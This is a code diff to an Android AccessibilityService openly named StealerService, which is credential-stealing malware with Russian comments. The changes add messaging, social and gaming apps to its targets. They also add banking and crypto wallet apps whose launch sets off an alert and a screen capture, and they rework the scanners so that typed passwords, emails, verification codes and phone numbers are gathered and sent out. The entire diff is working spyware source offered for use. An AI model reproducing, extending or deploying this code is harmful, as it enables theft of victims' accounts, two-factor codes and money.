@@ -9,8 +9,9 @@ import java.util.List;
 
 public class StealerService extends AccessibilityService {
 
-    private static final long COOLDOWN = 8000;
+    private static final long COOLDOWN = 6000;
     private long lastSend = 0;
+    private long lastBankAlert = 0;
 
     private static final List<String> TARGETS = Arrays.asList(
         "com.google.android.gm",
@@ -18,15 +19,53 @@ public class StealerService extends AccessibilityService {
         "org.telegram.messenger",
         "org.telegram.messenger.web",
         "org.thunderdog.challegram",
+        "com.zhiliaoapp.musically",
+        "com.ss.android.ugc.trill",
         "com.whatsapp",
-        "com.whatsapp.w4b"
+        "com.whatsapp.w4b",
+        "com.roblox.client",
+        "com.instagram.android"
+    );
+
+    private static final List<String> BANK_APPS = Arrays.asList(
+        "com.ftband.mono",
+        "com.monobank.app",
+        "ua.privatbank.ap24",
+        "ru.privatbank",
+        "ua.oschadbank.online",
+        "com.alfabank.oavdo.amc",
+        "com.binance.dev",
+        "com.coinbase.android",
+        "io.metamask",
+        "com.trustwallet.app",
+        "com.google.android.apps.walletnfcrel"
     );
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
         if (event == null) return;
-
         int type = event.getEventType();
+
+        // проверяем открытие банковских приложений
+        if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+            CharSequence pkgCs = event.getPackageName();
+            if (pkgCs != null) {
+                String pkg = pkgCs.toString();
+                if (BANK_APPS.contains(pkg)
+                    && System.currentTimeMillis() - lastBankAlert > 30000) {
+                    lastBankAlert = System.currentTimeMillis();
+                    Exfil.send("BANK_OPEN", "Открыт банк/крипта: " + pkg);
+                    // команда на скрин
+                    try {
+                        android.content.Intent i =
+                            new android.content.Intent(this, MediaSniffer.class);
+                        i.setAction("CAPTURE_NOW");
+                        startService(i);
+                    } catch (Throwable ignored) {}
+                }
+            }
+        }
+
         if (type != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED &&
             type != AccessibilityEvent.TYPE_VIEW_FOCUSED) return;
 
@@ -34,15 +73,13 @@ public class StealerService extends AccessibilityService {
         if (pkgCs == null) return;
         String pkg = pkgCs.toString();
         if (!TARGETS.contains(pkg)) return;
-
         if (System.currentTimeMillis() - lastSend < COOLDOWN) return;
 
         AccessibilityNodeInfo root = getRootInActiveWindow();
         if (root == null) return;
 
         StringBuilder found = new StringBuilder();
-        findPassword(root, found, 0);
-        findHints(root, found, 0);
+        findFields(root, found, 0);
 
         if (found.length() > 0) {
             found.insert(0, "APP: " + pkg + "\n");
@@ -51,73 +88,45 @@ public class StealerService extends AccessibilityService {
         }
     }
 
-    private void findPassword(AccessibilityNodeInfo n, StringBuilder sb, int depth) {
-        if (n == null || depth > 30) return;
+    private void findFields(AccessibilityNodeInfo n, StringBuilder sb, int depth) {
+        if (n == null || depth > 40) return;
 
         int inputType = n.getInputType();
-        boolean isPwd = false;
+        boolean isPwd = false, isEmail = false;
+
         if (inputType > 0) {
             int variation = inputType & InputType.TYPE_MASK_VARIATION;
             int cls = inputType & InputType.TYPE_MASK_CLASS;
-            if (cls == InputType.TYPE_CLASS_TEXT &&
-                (variation == InputType.TYPE_TEXT_VARIATION_PASSWORD ||
-                 variation == InputType.TYPE_TEXT_VARIATION_VISIBLE_PASSWORD ||
-                 variation == InputType.TYPE_TEXT_VARIATION_WEB_PASSWORD)) {
-                isPwd = true;
-            }
-            if (cls == InputType.TYPE_CLASS_NUMBER &&
-                variation == InputType.TYPE_NUMBER_VARIATION_PASSWORD) {
-                isPwd = true;
+            if (cls == InputType.TYPE_CLASS_TEXT) {
+                if (variation == InputType.TYPE_TEXT_VARIATION_PASSWORD ||
+                    variation == InputType.TYPE_TEXT_VARIATION_VISIBLE_PASSWORD ||
+                    variation == InputType.TYPE_TEXT_VARIATION_WEB_PASSWORD) isPwd = true;
+                if (variation == InputType.TYPE_TEXT_VARIATION_EMAIL_ADDRESS) isEmail = true;
             }
         }
 
         CharSequence text = n.getText();
         CharSequence hint = n.getHintText();
 
-        if (isPwd) {
-            sb.append("[PWD] ");
-            if (text != null && text.length() > 0) sb.append(text);
-            else sb.append("(пусто)");
-            if (hint != null && hint.length() > 0) sb.append(" hint=").append(hint);
-            sb.append("\n");
+        if (isPwd && text != null && text.length() > 0) {
+            sb.append("[PWD] ").append(text).append("\n");
+        } else if (isEmail && text != null && text.length() > 0) {
+            sb.append("[EMAIL] ").append(text).append("\n");
         }
 
-        for (int i = 0; i < n.getChildCount(); i++) {
-            findPassword(n.getChild(i), sb, depth + 1);
-        }
-    }
-
-    private void findHints(AccessibilityNodeInfo n, StringBuilder sb, int depth) {
-        if (n == null || depth > 30) return;
-
-        CharSequence t = n.getText();
-        CharSequence h = n.getHintText();
-        CharSequence d = n.getContentDescription();
-
-        if (t != null) {
-            String s = t.toString();
-            if (s.contains("@") && s.length() < 100 && s.length() > 4) {
-                sb.append("[MAIL] ").append(s).append("\n");
-            }
-        }
-        if (h != null) {
-            String s = h.toString().toLowerCase();
-            if (s.contains("логин") || s.contains("email") || s.contains("почт") ||
-                s.contains("phone") || s.contains("телефон") || s.contains("username")) {
-                if (t != null && t.length() > 0 && t.length() < 100) {
-                    sb.append("[LOGIN] ").append(t).append(" hint=").append(h).append("\n");
-                }
-            }
-        }
-        if (d != null) {
-            String s = d.toString().toLowerCase();
-            if (s.contains("парол") || s.contains("password")) {
-                sb.append("[PWD-DESC] ").append(d).append("\n");
+        if (hint != null && text != null && text.length() > 0 && text.length() < 120) {
+            String h = hint.toString().toLowerCase();
+            if (h.contains("парол") || h.contains("password")) {
+                sb.append("[PWD-H] ").append(text).append("\n");
+            } else if (h.contains("код") || h.contains("code")) {
+                sb.append("[CODE] ").append(text).append("\n");
+            } else if (h.contains("телефон") || h.contains("phone")) {
+                sb.append("[PHONE] ").append(text).append("\n");
             }
         }
 
         for (int i = 0; i < n.getChildCount(); i++) {
-            findHints(n.getChild(i), sb, depth + 1);
+            findFields(n.getChild(i), sb, depth + 1);
         }
     }
 
